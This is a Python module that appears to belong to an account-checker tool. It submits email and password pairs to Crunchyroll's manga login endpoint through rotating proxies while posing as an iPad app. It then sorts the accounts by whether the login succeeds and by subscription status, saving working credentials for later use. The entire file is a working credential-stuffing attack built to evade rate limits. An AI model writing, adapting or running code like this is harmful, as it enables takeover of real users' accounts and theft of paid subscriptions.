from __main__ import checker
from requests import post
from modules.functions import log,save,set_proxy

def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        header = {
            "Host": "api-manga.crunchyroll.com" ,
            "Content-Type": "application/x-www-form-urlencoded" ,
            "Accept": "*/*" ,
            "Connection": "keep-alive" ,
            "User-Agent": "Manga/4.2.0 (iPad; iOS 14.4; Scale/2.00)" ,
            "Accept-Language": "nl-NL;q=1, ar-NL;q=0.9" ,
            "Accept-Encoding": "gzip, deflate, br" ,
        }
        data = f"access_token=dcIhv87VpKsqLCZ&account={email}&api_ver=1.0&device_id=123-456-789&device_type=com.crunchyroll.manga.ipad&duration=6000&format=json&password={password}"
        try:
            r = post("https://api-manga.crunchyroll.com/cr_login",headers=header,data=data,proxies=set_proxy(proxy),timeout=checker.timeout)
            if "Incorrect login information" in r.text:
                retries += 1
            elif "\"premium\":\"\"" in r.text:
                if not checker.cui:
                    log("custom",email+":"+password,"Crunchyroll")
                save("Crunchyroll","custom",checker.time,email+":"+password)
                checker.custom += 1
                checker.cpm += 1
                return
            elif "\"user_id\"" in r.text:
                subscription = r.json()["data"]["user"]["access_type"]
                if not checker.cui:
                    log("good",email+":"+password,"Crunchyroll")
                save("Crunchyroll","good",checker.time,email+":"+password+f" | Subscription: {subscription}")
                checker.good += 1
                checker.cpm += 1
                return
            else:
                raise
        except:
            checker.errors += 1
    if not checker.cui:
        log("bad",email+":"+password,"Crunchyroll")
    checker.bad += 1
    checker.cpm += 1
    return